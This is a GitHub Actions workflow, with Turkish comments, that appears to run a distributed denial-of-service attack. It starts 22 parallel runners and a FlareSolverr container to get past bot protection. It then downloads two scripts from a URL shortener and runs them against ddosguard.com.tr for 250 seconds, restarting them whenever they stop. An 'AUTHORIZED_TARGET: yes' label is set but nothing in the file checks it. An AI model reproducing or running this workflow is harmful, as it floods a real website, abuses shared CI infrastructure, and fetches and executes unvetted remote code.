name: CRAW !
on:
  workflow_dispatch:

env:
  AUTHORIZED_TARGET: yes

jobs:
  vds:
    runs-on: ubuntu-latest
    strategy:
      max-parallel: 22
      matrix:
        instance: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22]
    
    steps:
      - name: Setup environment
        run: |
          sudo apt-get update
          # Docker kurulumunda Ã§akÄ±ÅŸmayÄ± Ã¶nle
          sudo apt-get remove -y containerd || true
          sudo apt-get install -y docker.io
          sudo systemctl start docker
          sudo systemctl enable docker
          
          # Node.js kurulumu
          curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
          sudo apt-get install -y nodejs
          
          # Gerekli paketler
          pip install requests

      - name: Download FlareSolverr
        run: |
          sudo docker pull flaresolverr/flaresolverr:latest
          sudo docker run -d --name flaresolverr -p 8191:8191 -e LOG_LEVEL=info --restart unless-stopped flaresolverr/flaresolverr:latest
          sleep 15
          echo "FlareSolverr checking..."
          curl -s -X GET "http://localhost:8191/v1" || echo "FlareSolverr ready"

      - name: Download scripts
        run: |
          wget https://curl.by/VudqN/v1.js -O v1.js
          wget https://curl.by/_8mO2/v2.js -O v2.js
          chmod +x v1.js v2.js
          npm install axios

      - name: Run v1.js with parameters
        env:
          AUTHORIZED_TARGET: yes
        run: |
          echo "Starting v1.js with FlareSolverr bypass..."
          node v1.js https://ddosguard.com.tr/ &
          V1_PID=$!
          echo $V1_PID > v1_pid.txt
          echo "v1.js started with PID: $V1_PID"

      - name: Run v2.js with parameters
        env:
          AUTHORIZED_TARGET: yes
        run: |
          echo "Waiting 10 seconds before starting v2.js..."
          sleep 10
          echo "Starting v2.js with attack parameters..."
          node v2.js https://ddosguard.com.tr/ 120 &
          V2_PID=$!
          echo $V2_PID > v2_pid.txt
          echo "v2.js started with PID: $V2_PID"

      - name: Run for 250 seconds
        env:
          AUTHORIZED_TARGET: yes
        run: |
          echo "All processes started. Running for 250 seconds..."
          
          # Toplam 250 saniye Ã§alÄ±ÅŸacak
          END_TIME=$((SECONDS + 250))
          
          while [ $SECONDS -lt $END_TIME ]; do
            REMAINING=$((END_TIME - SECONDS))
            echo "Time remaining: $REMAINING seconds"
            
            # Process kontrolÃ¼
            if [ -f v1_pid.txt ] && ps -p $(cat v1_pid.txt) > /dev/null; then
              echo "âœ“ v1.js is running"
            else
              echo "âœ— v1.js stopped, restarting..."
              node v1.js https://ddosguard.com.tr/ &
              echo $! > v1_pid.txt
            fi
            
            if [ -f v2_pid.txt ] && ps -p $(cat v2_pid.txt) > /dev/null; then
              echo "âœ“ v2.js is running"
            else
              echo "âœ— v2.js stopped, restarting..."
              node v2.js https://ddosguard.com.tr/ 120 &
              echo $! > v2_pid.txt
            fi
            
            # 10 saniye bekle
            sleep 10
          done
          
          echo "â° 250 seconds completed. Stopping processes..."

      - name: Cleanup
        if: always()
        run: |
          echo "Job completed at $(date)"
          
          # Process'leri durdur
          if [ -f v1_pid.txt ]; then
            kill $(cat v1_pid.txt) 2>/dev/null || true
          fi
          if [ -f v2_pid.txt ]; then
            kill $(cat v2_pid.txt) 2>/dev/null || true
          fi
          
          pkill -f "v1.js" || true
          pkill -f "v2.js" || true
          
          # Docker temizliÄŸi
          sudo docker stop flaresolverr 2>/dev/null || true
          sudo docker rm flaresolverr 2>/dev/null || true
          
          # Dosya temizliÄŸi
          rm -f v1_pid.txt v2_pid.txt
          
          echo "ðŸ§¹ Cleanup completed"
